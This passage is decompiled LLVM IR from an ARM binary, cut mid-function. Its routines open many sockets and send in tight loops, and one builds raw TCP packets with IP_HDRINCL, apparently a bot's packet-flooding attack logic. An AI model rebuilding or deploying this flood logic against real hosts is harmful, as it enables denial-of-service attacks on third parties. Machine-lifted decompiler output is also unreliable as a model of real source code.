  %v3_a614 = mul i32 %v6_a60c, 65536
  store i32 %v3_a614, i32* %fp.global-to-local, align 4
  %v0_a620 = load i32, i32* @r4, align 4
  %v5_a624 = inttoptr i32 %v0_a610 to i32*
  %v6_a624 = call i32 @function_930c(i32 %v0_a620, i32* %v5_a624, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  %v0_a630 = load i32, i32* @r6, align 4
  store i32 %v0_a630, i32* %r1.global-to-local, align 4
  %v0_a634 = load i32, i32* @r4, align 4
  %v3_a63c = urem i32 %v6_a624, 65536
  store i32 %v3_a63c, i32* @r6, align 4
  %v5_a640 = inttoptr i32 %v0_a630 to i32*
  %v6_a640 = call i32 @function_930c(i32 %v0_a634, i32* %v5_a640, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_a644 = load i32, i32* %fp.global-to-local, align 4
  %v3_a644 = udiv i32 %v0_a644, 65536
  store i32 %v3_a644, i32* %r4.global-to-local, align 4
  %v1_a64c = load i32, i32* @r5, align 4
  %v9_a64c = icmp eq i32 %v3_a644, %v1_a64c
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_a64c, label %dec_label_pc_a674, label %bb

bb:                                               ; preds = %dec_label_pc_a59c
  %v2_a660 = mul nuw nsw i32 %v3_a644, 256
  %v4_a664 = and i32 %v2_a660, 65280
  %v1_a668 = urem i32 %v6_a640, 256
  store i32 %v1_a668, i32* @r8, align 4
  %v5_a66c = udiv i32 %v0_a644, 16777216
  %v6_a66c = or i32 %v4_a664, %v5_a66c
  br label %dec_label_pc_a680

dec_label_pc_a674:                                ; preds = %dec_label_pc_a59c
  %v1_a6687 = urem i32 %v6_a640, 256
  store i32 %v1_a6687, i32* @r8, align 4
  %v0_a674 = call i32 @function_f6c4()
  %v3_a67c = urem i32 %v0_a674, 65536
  br label %dec_label_pc_a680

dec_label_pc_a680:                                ; preds = %bb, %dec_label_pc_a674
  %storemerge17 = phi i32 [ %v6_a66c, %bb ], [ %v3_a67c, %dec_label_pc_a674 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_a680 = load i32, i32* @r7, align 4
  %tmp42 = icmp slt i32 %v0_a680, 1
  br i1 %tmp42, label %dec_label_pc_a82c.preheader.thread, label %dec_label_pc_a688

dec_label_pc_a82c.preheader.thread:               ; preds = %dec_label_pc_a680
  br label %dec_label_pc_a7f4

dec_label_pc_a82c.preheader:                      ; preds = %dec_label_pc_a788
  %tmp444749 = icmp slt i32 %v1_a6dc, 1
  br i1 %tmp444749, label %dec_label_pc_a7f4, label %dec_label_pc_a7f8.lr.ph

dec_label_pc_a688:                                ; preds = %dec_label_pc_a680
  store i32 %v3_a5f4, i32* %r1.global-to-local, align 4
  %v3_a68c = udiv i32 %v6_a5ec, 256
  %v5_a698 = trunc i32 %v3_a68c to i8
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_a6b0 = udiv i32 %v6_a5ec, 65536
  %v4_a6c0 = trunc i32 %v3_a6b0 to i8
  store i8 %v4_a6c0, i8* %stack_var_-80, align 1
  %v3_a7d4 = icmp eq i32 %v3_a5f4, 65535
  %v2_a6f8 = ptrtoint i32* %stack_var_-52 to i32
  %tmp43 = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_a7b8

dec_label_pc_a6c8:                                ; preds = %dec_label_pc_a7b8
  %v2_a6c8 = load i8, i8* %stack_var_-80, align 1
  %v3_a6c8 = sext i8 %v2_a6c8 to i32
  store i32 %v3_a6c8, i32* %r1.global-to-local, align 4
  %v2_a6cc = load i32, i32* %r5.global-to-local, align 4
  %v3_a6cc = add i32 %v2_a6cc, 2
  %v4_a6cc = inttoptr i32 %v3_a6cc to i8*
  store i8 %v5_a698, i8* %v4_a6cc, align 1
  %v0_a6d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a6d0 = trunc i32 %v0_a6d0 to i8
  %v2_a6d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_a6d0 = add i32 %v2_a6d0, 3
  %v4_a6d0 = inttoptr i32 %v3_a6d0 to i8*
  store i8 %v1_a6d0, i8* %v4_a6d0, align 1
  br label %dec_label_pc_a6d4

dec_label_pc_a6d4:                                ; preds = %dec_label_pc_a7e0, %dec_label_pc_a6c8
  %v1_a6dc = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_a6ec = call i32 @socket(i32 2, i32 0, i32 0)
  %v7_a6f4 = icmp eq i32 %v3_a6ec, -1
  store i32 %v2_a6f8, i32* %r1.global-to-local, align 4
  %v2_a704 = load i32, i32* @sb, align 4
  %v3_a704 = add i32 %v2_a704, %stack_var_-60.0
  %v4_a704 = inttoptr i32 %v3_a704 to i32*
  store i32 %v3_a6ec, i32* %v4_a704, align 4
  br i1 %v7_a6f4, label %dec_label_pc_a838, label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a6d4
  store i32 2, i32* %stack_var_-52, align 4
  %v5_a72c = call i32 @bind(i32 %v3_a6ec, %sockaddr* %tmp43, i32 16)
  %v0_a730 = load i32, i32* %r5.global-to-local, align 4
  %v1_a730 = add i32 %v0_a730, 20
  %v2_a730 = inttoptr i32 %v1_a730 to i8*
  %v3_a730 = load i8, i8* %v2_a730, align 1
  %tmp53 = icmp ugt i8 %v3_a730, 31
  br i1 %tmp53, label %dec_label_pc_a788, label %dec_label_pc_a73c

dec_label_pc_a73c:                                ; preds = %dec_label_pc_a70c
  %v1_a73c = add i32 %v0_a730, 16
  %v2_a73c = inttoptr i32 %v1_a73c to i32*
  %v3_a73c = load i32, i32* %v2_a73c, align 4
  store i32 %v3_a73c, i32* %r4.global-to-local, align 4
  %v0_a740 = call i32 @function_f6c4()
  %v1_a748 = and i32 %v3_a73c, 65280
  %v3_a750 = mul i32 %v3_a73c, 16777216
  %v4_a754 = mul nuw nsw i32 %v1_a748, 256
  %v5_a754 = or i32 %v4_a754, %v3_a750
  store i32 %v5_a754, i32* %r1.global-to-local, align 4
  %v0_a75c = load i32, i32* %r5.global-to-local, align 4
  %v1_a75c = add i32 %v0_a75c, 20
  %v2_a75c = inttoptr i32 %v1_a75c to i8*
  %v3_a75c = load i8, i8* %v2_a75c, align 1
  %v4_a75c = zext i8 %v3_a75c to i32
  %v2_a760 = call i32 @llvm.bswap.i32(i32 %v3_a73c)
  %v7_a764 = lshr i32 %v0_a740, %v4_a75c
  %v8_a764 = add i32 %v7_a764, %v2_a760
  %v3_a770 = mul i32 %v8_a764, 16777216
  %v1_a774 = and i32 %v8_a764, 65280
  %v4_a778 = mul nuw nsw i32 %v1_a774, 256
  %v5_a778 = or i32 %v4_a778, %v3_a770
  store i32 %v5_a778, i32* %r1.global-to-local, align 4
  %v2_a780 = call i32 @llvm.bswap.i32(i32 %v8_a764)
  %v2_a784 = add i32 %v0_a75c, 4
  %v3_a784 = inttoptr i32 %v2_a784 to i32*
  store i32 %v2_a780, i32* %v3_a784, align 4
  %v0_a794.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_a788

dec_label_pc_a788:                                ; preds = %dec_label_pc_a70c, %dec_label_pc_a73c
  %v0_a794 = phi i32 [ %v0_a730, %dec_label_pc_a70c ], [ %v0_a794.pre, %dec_label_pc_a73c ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_a790 = load i32, i32* @sb, align 4
  %v2_a790 = add i32 %v1_a790, %stack_var_-60.0
  %v3_a790 = inttoptr i32 %v2_a790 to i32*
  %v4_a790 = load i32, i32* %v3_a790, align 4
  %v1_a794 = inttoptr i32 %v0_a794 to %sockaddr*
  store i32 %v0_a794, i32* %r1.global-to-local, align 4
  %v5_a798 = call i32 @connect(i32 %v4_a790, %sockaddr* %v1_a794, i32 16)
  %v1_a7a4 = add i32 %stack_var_-60.0, 4
  %v1_a7a8 = load i32, i32* @r7, align 4
  %v9_a7a8 = icmp eq i32 %v1_a6dc, %v1_a7a8
  %v0_a7b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_a7b0 = add i32 %v0_a7b0, 24
  store i32 %v1_a7b0, i32* %r5.global-to-local, align 4
  br i1 %v9_a7a8, label %dec_label_pc_a82c.preheader, label %dec_label_pc_a7b8

dec_label_pc_a7b8:                                ; preds = %dec_label_pc_a788, %dec_label_pc_a688
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_a688 ], [ %v1_a7a4, %dec_label_pc_a788 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_a688 ], [ %v1_a6dc, %dec_label_pc_a788 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_a7c4 = call i32* @calloc(i32 65535, i32 1)
  %v3_a7c4 = ptrtoint i32* %v2_a7c4 to i32
  store i32 %v3_a5f4, i32* %r1.global-to-local, align 4
  %v2_a7d8 = load i32, i32* @sl, align 4
  %v3_a7d8 = add i32 %v2_a7d8, %stack_var_-60.0
  %v4_a7d8 = inttoptr i32 %v3_a7d8 to i32*
  store i32 %v3_a7c4, i32* %v4_a7d8, align 4
  br i1 %v3_a7d4, label %dec_label_pc_a7e0, label %dec_label_pc_a6c8

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a7b8
  %v0_a7e0 = call i32 @function_f6c4()
  %v1_a7e0 = trunc i32 %v0_a7e0 to i8
  %v4_a7e4 = sdiv i32 %v0_a7e0, 256
  %v1_a7e8 = trunc i32 %v4_a7e4 to i8
  %v2_a7e8 = load i32, i32* %r5.global-to-local, align 4
  %v3_a7e8 = add i32 %v2_a7e8, 3
  %v4_a7e8 = inttoptr i32 %v3_a7e8 to i8*
  store i8 %v1_a7e8, i8* %v4_a7e8, align 1
  %v3_a7ec = load i32, i32* %r5.global-to-local, align 4
  %v4_a7ec = add i32 %v3_a7ec, 2
  %v5_a7ec = inttoptr i32 %v4_a7ec to i8*
  store i8 %v1_a7e0, i8* %v5_a7ec, align 1
  br label %dec_label_pc_a6d4

dec_label_pc_a7f4:                                ; preds = %dec_label_pc_a82c.loopexit, %dec_label_pc_a82c.preheader.thread, %dec_label_pc_a82c.preheader, %dec_label_pc_a830.loopexit, %dec_label_pc_a7f4
  br label %dec_label_pc_a7f4

dec_label_pc_a7f8:                                ; preds = %dec_label_pc_a7f8.lr.ph, %dec_label_pc_a830.loopexit
  %v0_a7f8 = load i32, i32* @r8, align 4
  %v2_a7f8 = icmp eq i32 %v0_a7f8, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_a7f8, label %dec_label_pc_a800, label %dec_label_pc_a840

dec_label_pc_a800:                                ; preds = %dec_label_pc_a7f8
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a808

dec_label_pc_a808:                                ; preds = %dec_label_pc_a808, %dec_label_pc_a800
  %v0_a810 = phi i32 [ %v1_a810, %dec_label_pc_a808 ], [ 0, %dec_label_pc_a800 ]
  %v0_a808 = phi i32 [ %v1_a824, %dec_label_pc_a808 ], [ 0, %dec_label_pc_a800 ]
  %v1_a808 = load i32, i32* @sb, align 4
  %v2_a808 = add i32 %v1_a808, %v0_a808
  %v3_a808 = inttoptr i32 %v2_a808 to i32*
  %v4_a808 = load i32, i32* %v3_a808, align 4
  %v1_a80c = load i32, i32* @sl, align 4
  %v2_a80c = add i32 %v1_a80c, %v0_a808
  %v3_a80c = inttoptr i32 %v2_a80c to i32*
  %v4_a80c = load i32, i32* %v3_a80c, align 4
  store i32 %v4_a80c, i32* %r1.global-to-local, align 4
  %v1_a810 = add i32 %v0_a810, 1
  store i32 %v1_a810, i32* %r5.global-to-local, align 4
  %v0_a814 = load i32, i32* @r6, align 4
  %v4_a81c = inttoptr i32 %v4_a80c to i32*
  %v5_a81c = call i32 @send(i32 %v4_a808, i32* %v4_a81c, i32 %v0_a814, i32 16384)
  %v1_a820 = load i32, i32* @r7, align 4
  %v9_a820 = icmp eq i32 %v1_a810, %v1_a820
  %v0_a824 = load i32, i32* %r4.global-to-local, align 4
  %v1_a824 = add i32 %v0_a824, 4
  store i32 %v1_a824, i32* %r4.global-to-local, align 4
  br i1 %v9_a820, label %dec_label_pc_a82c.loopexit, label %dec_label_pc_a808

dec_label_pc_a82c.loopexit:                       ; preds = %dec_label_pc_a808
  %tmp4447 = icmp slt i32 %v1_a810, 1
  br i1 %tmp4447, label %dec_label_pc_a7f4, label %dec_label_pc_a7f8.lr.ph

dec_label_pc_a7f8.lr.ph:                          ; preds = %dec_label_pc_a82c.preheader, %dec_label_pc_a82c.loopexit
  br label %dec_label_pc_a7f8

dec_label_pc_a830.loopexit:                       ; preds = %dec_label_pc_a848
  %tmp44 = icmp slt i32 %v0_a870, 1
  br i1 %tmp44, label %dec_label_pc_a7f4, label %dec_label_pc_a7f8

dec_label_pc_a838:                                ; preds = %dec_label_pc_a6d4
  store i32 %v3_a59c, i32* %r4.global-to-local, align 4
  store i32 %v6_a59c, i32* %r5.global-to-local, align 4
  store i32 %v24_a59c, i32* %fp.global-to-local, align 4
  ret i32 -1

dec_label_pc_a840:                                ; preds = %dec_label_pc_a7f8
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_a848

dec_label_pc_a848:                                ; preds = %dec_label_pc_a848, %dec_label_pc_a840
  %v0_a848 = phi i32 [ %v1_a874, %dec_label_pc_a848 ], [ 0, %dec_label_pc_a840 ]
  %v1_a848 = load i32, i32* @sl, align 4
  %v2_a848 = add i32 %v1_a848, %v0_a848
  %v3_a848 = inttoptr i32 %v2_a848 to i32*
  %v4_a848 = load i32, i32* %v3_a848, align 4
  store i32 %v4_a848, i32* @r4, align 4
  %v0_a84c = load i32, i32* @r6, align 4
  store i32 %v0_a84c, i32* @r1, align 4
  %v1_a854 = inttoptr i32 %v4_a848 to i8*
  %v2_a854 = call i32 @function_f844(i8* %v1_a854)
  %v0_a858 = load i32, i32* @r5, align 4
  %v1_a858 = add i32 %v0_a858, 1
  store i32 %v1_a858, i32* @r5, align 4
  %v0_a85c = load i32, i32* @fp, align 4
  %v1_a85c = load i32, i32* @sb, align 4
  %v2_a85c = add i32 %v1_a85c, %v0_a85c
  %v3_a85c = inttoptr i32 %v2_a85c to i32*
  %v4_a85c = load i32, i32* %v3_a85c, align 4
  %v0_a860 = load i32, i32* @r4, align 4
  store i32 %v0_a860, i32* %r1.global-to-local, align 4
  %v0_a864 = load i32, i32* @r6, align 4
  %v4_a86c = inttoptr i32 %v0_a860 to i32*
  %v5_a86c = call i32 @send(i32 %v4_a85c, i32* %v4_a86c, i32 %v0_a864, i32 16384)
  %v0_a870 = load i32, i32* @r5, align 4
  %v1_a870 = load i32, i32* @r7, align 4
  %v9_a870 = icmp eq i32 %v0_a870, %v1_a870
  %v0_a874 = load i32, i32* @fp, align 4
  %v1_a874 = add i32 %v0_a874, 4
  store i32 %v1_a874, i32* @fp, align 4
  br i1 %v9_a870, label %dec_label_pc_a830.loopexit, label %dec_label_pc_a848

; uselistorder directives
  uselistorder i32 %v1_a874, { 1, 0 }
  uselistorder i32 %v0_a870, { 1, 0 }
  uselistorder i32 %v1_a824, { 1, 0 }
  uselistorder i32 %v1_a810, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 4, 1, 3 }
  uselistorder i32 %v8_a764, { 1, 2, 0 }
  uselistorder i32 %v3_a73c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a6ec, { 1, 2, 0 }
  uselistorder i32 %v1_a6dc, { 1, 2, 0 }
  uselistorder i32 %v3_a644, { 0, 2, 1 }
  uselistorder i32 %v3_a5f4, { 0, 3, 1, 2 }
  uselistorder i32 %v1_a5a0, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_a7f8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_a7f8, { 1, 0 }
  uselistorder label %dec_label_pc_a7f4, { 3, 0, 4, 2, 1 }
  uselistorder label %dec_label_pc_a788, { 1, 0 }
  uselistorder label %dec_label_pc_a680, { 1, 0 }
}

define i32 @function_a884(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a884:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp39 = call i8 @__decompiler_undefined_function_1()
  %tmp40 = call i8 @__decompiler_undefined_function_1()
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_a884 = load i32, i32* @r4, align 4
  %v1_a888 = urem i32 %arg1, 256
  store i32 %v1_a888, i32* @fp, align 4
  store i32 %v1_a888, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_a8a0 = urem i32 %arg3, 256
  store i32 %v1_a8a0, i32* @r4, align 4
  %v2_a8a4 = call i32* @calloc(i32 %v1_a888, i32 16)
  %v4_a8a4 = ptrtoint i32* %v2_a8a4 to i32
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_a8b0 = load i32, i32* @fp, align 4
  store i32 %v0_a8b0, i32* %r0.global-to-local, align 4
  %v2_a8b4 = call i32* @calloc(i32 %v0_a8b0, i32 4)
  %v4_a8b4 = ptrtoint i32* %v2_a8b4 to i32
  %v0_a8b8 = load i32, i32* @r5, align 4
  store i32 %v0_a8b8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8c8 = load i32, i32* @r4, align 4
  store i32 %v0_a8c8, i32* %r0.global-to-local, align 4
  %v5_a8cc = inttoptr i32 %v0_a8b8 to i32*
  %v6_a8cc = call i32 @function_930c(i32 %v0_a8c8, i32* %v5_a8cc, i32 2, i32 0, i32 %v4_a8b4)
  %v1_a8d8 = urem i32 %v6_a8cc, 256
  store i32 %v1_a8d8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8e4 = load i32, i32* @r5, align 4
  store i32 %v0_a8e4, i32* %r1.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @r4, align 4
  store i32 %v0_a8e8, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a8cc, 16777216
  %v5_a8f0 = sdiv i32 %sext, 16777216
  %v6_a8f0 = inttoptr i32 %v0_a8e4 to i32*
  %v7_a8f0 = call i32 @function_930c(i32 %v0_a8e8, i32* %v6_a8f0, i32 3, i32 65535, i32 %v5_a8f0)
  %v0_a8f4 = load i32, i32* @r5, align 4
  store i32 %v0_a8f4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8f0, i32* @r6, align 4
  %v0_a904 = load i32, i32* @r4, align 4
  store i32 %v0_a904, i32* %r0.global-to-local, align 4
  %v5_a908 = inttoptr i32 %v0_a8f4 to i32*
  %v6_a908 = call i32 @function_930c(i32 %v0_a904, i32* %v5_a908, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a910 = urem i32 %v6_a908, 256
  store i32 %v1_a910, i32* %ip.global-to-local, align 4
  %v0_a914 = load i32, i32* @r5, align 4
  store i32 %v0_a914, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a920 = load i32, i32* @r4, align 4
  store i32 %v0_a920, i32* %r0.global-to-local, align 4
  %sext9 = mul i32 %v6_a908, 16777216
  %v5_a928 = sdiv i32 %sext9, 16777216
  %v6_a928 = inttoptr i32 %v0_a914 to i32*
  %v7_a928 = call i32 @function_930c(i32 %v0_a920, i32* %v6_a928, i32 5, i32 1, i32 %v5_a928)
  %v1_a934 = urem i32 %v7_a928, 256
  store i32 %v1_a934, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a944 = load i32, i32* @r4, align 4
  store i32 %v0_a944, i32* %r0.global-to-local, align 4
  %v5_a94c = inttoptr i32 %v0_a93c to i32*
  %v6_a94c = call i32 @function_930c(i32 %v0_a944, i32* %v5_a94c, i32 7, i32 65535, i32 %v1_a934)
  %v0_a950 = load i32, i32* @r5, align 4
  store i32 %v0_a950, i32* %r1.global-to-local, align 4
  %v3_a954 = mul i32 %v6_a94c, 65536
  store i32 %v3_a954, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a960 = load i32, i32* @r4, align 4
  store i32 %v0_a960, i32* %r0.global-to-local, align 4
  %v5_a964 = inttoptr i32 %v0_a950 to i32*
  %v6_a964 = call i32 @function_930c(i32 %v0_a960, i32* %v5_a964, i32 11, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_a96c = urem i32 %v6_a964, 256
  store i32 %v1_a96c, i32* %ip.global-to-local, align 4
  %v0_a970 = load i32, i32* @r5, align 4
  store i32 %v0_a970, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a97c = load i32, i32* @r4, align 4
  store i32 %v0_a97c, i32* %r0.global-to-local, align 4
  %v5_a984 = inttoptr i32 %v0_a970 to i32*
  %v6_a984 = call i32 @function_930c(i32 %v0_a97c, i32* %v5_a984, i32 12, i32 1, i32 %v1_a96c)
  %v1_a98c = urem i32 %v6_a984, 256
  store i32 %v1_a98c, i32* %ip.global-to-local, align 4
  %v0_a990 = load i32, i32* @r5, align 4
  store i32 %v0_a990, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a99c = load i32, i32* @r4, align 4
  store i32 %v0_a99c, i32* %r0.global-to-local, align 4
  %v5_a9a4 = inttoptr i32 %v0_a990 to i32*
  %v6_a9a4 = call i32 @function_930c(i32 %v0_a99c, i32* %v5_a9a4, i32 13, i32 1, i32 %v1_a98c)
  %v1_a9ac = urem i32 %v6_a9a4, 256
  store i32 %v1_a9ac, i32* %ip.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r5, align 4
  store i32 %v0_a9b0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a9bc = load i32, i32* @r4, align 4
  store i32 %v0_a9bc, i32* %r0.global-to-local, align 4
  %v5_a9c4 = inttoptr i32 %v0_a9b0 to i32*
  %v6_a9c4 = call i32 @function_930c(i32 %v0_a9bc, i32* %v5_a9c4, i32 14, i32 1, i32 %v1_a9ac)
  %v1_a9cc = urem i32 %v6_a9c4, 256
  store i32 %v1_a9cc, i32* %ip.global-to-local, align 4
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a9dc = load i32, i32* @r4, align 4
  store i32 %v0_a9dc, i32* %r0.global-to-local, align 4
  %v5_a9e4 = inttoptr i32 %v0_a9d0 to i32*
  %v6_a9e4 = call i32 @function_930c(i32 %v0_a9dc, i32* %v5_a9e4, i32 15, i32 1, i32 %v1_a9cc)
  %v1_a9ec = urem i32 %v6_a9e4, 256
  store i32 %v1_a9ec, i32* %ip.global-to-local, align 4
  %v0_a9f0 = load i32, i32* @r5, align 4
  store i32 %v0_a9f0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a9fc = load i32, i32* @r4, align 4
  store i32 %v0_a9fc, i32* %r0.global-to-local, align 4
  %v5_aa04 = inttoptr i32 %v0_a9f0 to i32*
  %v6_aa04 = call i32 @function_930c(i32 %v0_a9fc, i32* %v5_aa04, i32 16, i32 1, i32 %v1_a9ec)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_aa04, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_aa14 = load i32, i32* @r5, align 4
  store i32 %v0_aa14, i32* %r1.global-to-local, align 4
  %v0_aa18 = load i32, i32* @r4, align 4
  store i32 %v0_aa18, i32* %r0.global-to-local, align 4
  %v1_aa1c = urem i32 %v6_aa04, 256
  store i32 %v1_aa1c, i32* @r8, align 4
  %v5_aa20 = inttoptr i32 %v0_aa14 to i32*
  %v6_aa20 = call i32 @function_930c(i32 %v0_aa18, i32* %v5_aa20, i32 0, i32 768, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aa2c = load i32, i32* @r5, align 4
  store i32 %v0_aa2c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa20, i32* @sb, align 4
  %v0_aa34 = load i32, i32* @r4, align 4
  store i32 %v0_aa34, i32* %r0.global-to-local, align 4
  %v5_aa38 = inttoptr i32 %v0_aa2c to i32*
  %v6_aa38 = call i32 @function_930c(i32 %v0_aa34, i32* %v5_aa38, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_aa44 = urem i32 %v6_aa38, 256
  store i32 %v1_aa44, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_aa54 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_aa54, i32* %r0.global-to-local, align 4
  %v0_aa58 = load i32, i32* @r7, align 4
  %v3_aa58 = udiv i32 %v0_aa58, 65536
  store i32 %v3_aa58, i32* %r1.global-to-local, align 4
  %v2_aa5c = icmp eq i32 %v3_aa54, -1
  store i1 %v2_aa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aa5c, label %dec_label_pc_ace0, label %dec_label_pc_aa6c

dec_label_pc_aa6c:                                ; preds = %dec_label_pc_a884
  store i32 1, i32* %stack_var_-40, align 4
  %v6_aa74 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_aa74, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_aa88 = call i32 @setsockopt(i32 %v3_aa54, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_aa88, i32* %r0.global-to-local, align 4
  %v2_aa8c = icmp eq i32 %v7_aa88, -1
  store i1 %v2_aa8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aa8c, label %dec_label_pc_acd8, label %dec_label_pc_aa94

dec_label_pc_aa94:                                ; preds = %dec_label_pc_aa6c
  %v0_aa94 = load i32, i32* @fp, align 4
  %v2_aa94 = icmp eq i32 %v0_aa94, 0
  store i1 %v2_aa94, i1* %cpsr_z.global-to-local, align 1
  %v0_aa98 = load i32, i32* @r6, align 4
  %v3_aa98 = mul i32 %v0_aa98, 65536
  store i32 %v3_aa98, i32* %r0.global-to-local, align 4
  %v3_aa9c = urem i32 %v0_aa98, 65536
  store i32 %v3_aa9c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp84 = icmp slt i32 %v0_aa94, 1
  br i1 %tmp84, label %.thread26, label %dec_label_pc_aac0.preheader

.thread26:                                        ; preds = %dec_label_pc_aa94
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_af60

dec_label_pc_aac0.preheader:                      ; preds = %dec_label_pc_aa94
  %v5_aaa4 = load i32, i32* @r7, align 4
  %v8_aaa4 = udiv i32 %v5_aaa4, 16777216
  %tmp85 = udiv i32 %v0_aa98, 256
  %v8_aaa8 = urem i32 %tmp85, 256
  store i32 %v8_aaa8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_aacc = urem i32 %v0_aa98, 256
  %v3_abb8 = icmp ugt i32 %v0_aa58, -65537
  %v2_abdc = ptrtoint i32* %stack_var_-60 to i32
  %tmp86 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v4_abf8 = mul nuw nsw i32 %v1_aacc, 256
  %v5_abf8 = or i32 %v8_aaa8, %v4_abf8
  %sext10 = mul i32 %tmp85, 16777216
  %v4_ac04 = sdiv i32 %sext10, 16777216
  %v3_ac0c = ashr i32 %sext10, 31
  %tmp87 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v2_ac3c = ptrtoint i32* %stack_var_-332 to i32
  %v2_ac40 = ptrtoint i32* %stack_var_-44 to i32
